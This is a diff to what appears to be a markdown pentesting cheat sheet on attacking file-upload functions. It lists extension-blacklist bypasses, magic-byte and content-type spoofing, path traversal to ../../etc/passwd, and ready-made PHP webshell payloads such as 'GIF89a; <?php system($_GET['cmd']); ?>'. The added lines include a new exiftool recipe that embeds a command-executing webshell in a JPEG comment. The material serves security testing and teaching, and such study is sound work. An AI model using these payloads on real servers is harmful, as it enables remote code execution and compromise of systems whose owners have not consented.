@@ -1,7 +1,7 @@
 ## Upload Function
 
 - Upload Function
-    - Extensions Impact
+    - # Extensions Impact
         - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
         - `SVG`: Stored XSS, SSRF, XXE
         - `GIF`: Stored XSS, SSRF
@@ -13,7 +13,7 @@
         - `ZIP`: RCE via LFI, DoS
         - `PDF`, `PPTX`: SSRF, BLIND XXE   
         - - - -
-    - Bypass
+    - # Bypass
         - [ ] Blacklisting Bypass
             - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
             - ASP → `asp`, `.aspx`, `.cer`, `.asa`
@@ -49,6 +49,7 @@
 
             - [ ]  Content Bypass Shell
             - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )
+            - GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:
 
             ```php
             GIF89a; <?php system($_GET['cmd']); ?>
@@ -85,10 +86,21 @@
             shell2.png.pHp: JPEG image data
             ```
 	    > How to find out uploader is checking file signature or its checking file extention and content-type?
-	    > > Lets try to change the our shell extension to .jpg and try to upload it. It still fails. So we can conclude that it is not checking the file name extension. The same happens if we change the content-Type to jpg and file name as it is. If its still fails we can understand that uploader is checking file signature.
+	    > > Lets try to change the our shell extension to .jpg and try to upload it. It still fails. So we can conclude that it is not checking the file name extension. The same 		    happens if we change the content-Type to jpg and file name as it is. If its still fails we can understand that uploader is checking file signature.
+
+	
+		<br></br>		    
+        - [ ] Comment in jpg file Bypass<br></br>
+            > For file uploads which validate image size using php `getimagesize()`, it may be possible to execute shellcode by inserting it into the Comment attribute of Image 		    > properties and saving it as file.jpg.php.
+            > You can do this with gimp or exiftools:
+			```php
+			└─$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
+			└─$ mv file.jpg file.php.jpg
+			```
+
         - - - -
       
-    - Vulnerabilities
+    - # Vulnerabilities
         - [ ]  Directory Traversal
             - Set filename `../../etc/passwd/logo.png`
             - Set filename `../../../logo.png` as it might changed the website logo.
@@ -174,7 +186,7 @@
             </code>
             ```
         - - - -
-    - Misc
+    - # Misc
         - [ ]  Uploading `file.js` & `file.config` (web.config)
         - [ ]  Pixel flood attack using image
         - [ ]  DoS with a large values name: `1234...99.png`
@@ -187,7 +199,7 @@
             exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
             ```
         - - - -            
-    - My Full Scanario For Bypass:
+    - # My Full Scanario For Bypass:
 
         -   Just uploading .php file instead of jpg file.
         -   Trying double extensions to bypass and upload php file pic.jpg.php or pic.php.jpg
@@ -196,7 +208,7 @@
         -   Tried special characters to bypass pic.php%00 , pic.php%0a, pic.php%00
         -   Basically every file extension has its own magic number, and I took a php-reverse-shell.php file and using hex editor I added the magic number of jpeg i.e., FF D8 FF E0 at start of the php file using the hex tool.
         - - - -
-    - Vulnerable uploader code for mgic bytes:
+    - # Vulnerable uploader code for mgic bytes:
         - [ ]  PHP code:
             ```php
             <?php
